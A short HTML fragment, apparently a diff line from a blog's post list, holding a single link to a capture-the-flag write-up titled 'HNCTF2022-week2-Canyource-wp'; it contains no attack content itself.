-        <a href="/2023/09/26/HNCTF2022-Canyource-wp/" ><i class="fa fa-file-o"></i>HNCTF2022-week2-Canyource-wp</a>
       </li>
     
   </ul>
